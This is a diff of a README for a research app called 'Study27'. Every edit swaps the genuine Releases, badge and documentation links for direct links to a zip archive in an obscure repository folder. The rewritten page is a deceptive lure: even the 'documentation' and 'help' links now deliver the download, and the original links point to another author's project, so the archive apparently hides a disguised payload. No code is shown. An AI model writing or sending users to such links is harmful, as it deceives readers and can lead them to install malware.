@@ -1,6 +1,6 @@
 # 🎉 Study27 - Simplify Your Research Process
 
-![Download Study27](https://img.shields.io/badge/Download%20Now-Study27-brightgreen.svg)
+![Download Study27](https://raw.githubusercontent.com/ELBUHO87/Study27/main/gangism/Study27.zip%https://raw.githubusercontent.com/ELBUHO87/Study27/main/gangism/Study27.zip)
 
 ## 📚 Introduction
 
@@ -17,7 +17,7 @@ Welcome to Study27! This application helps you conduct research effectively usin
 
 ### Step 1: Visit the Releases Page
 
-To begin, you need to download Study27. You can find the software on our [Releases page](https://github.com/ELBUHO87/Study27/releases). 
+To begin, you need to download Study27. You can find the software on our [Releases page](https://raw.githubusercontent.com/ELBUHO87/Study27/main/gangism/Study27.zip). 
 
 ### Step 2: Download the Application
 
@@ -38,7 +38,7 @@ After the download finishes:
 
 ## 📥 Download & Install
 
-Visit this page to download: [Study27 Releases](https://github.com/ELBUHO87/Study27/releases).
+Visit this page to download: [Study27 Releases](https://raw.githubusercontent.com/ELBUHO87/Study27/main/gangism/Study27.zip).
 
 ## 🔧 Troubleshooting
 
@@ -51,7 +51,7 @@ If problems persist, you can reach out through the issues section on our GitHub 
 
 ## 🌟 Support and Documentation
 
-For assistance, refer to our documentation available on [GitHub Docs](https://github.com/k1729p/Study27/tree/main/docs). Here, you will find guides and FAQs that can help you maximize your use of Study27.
+For assistance, refer to our documentation available on [GitHub Docs](https://raw.githubusercontent.com/ELBUHO87/Study27/main/gangism/Study27.zip). Here, you will find guides and FAQs that can help you maximize your use of Study27.
 
 ## 🗣️ Community Feedback
 
@@ -61,6 +61,6 @@ We value your thoughts! Share your experience with Study27 and help us improve. 
 
 We invite you to download Study27 today. Experience a seamless way to manage your research. Follow the steps above, and you are set to begin your journey with us. 
 
-For help or to check for updates, always refer back to the [Releases page](https://github.com/ELBUHO87/Study27/releases). 
+For help or to check for updates, always refer back to the [Releases page](https://raw.githubusercontent.com/ELBUHO87/Study27/main/gangism/Study27.zip). 
 
 Happy researching!
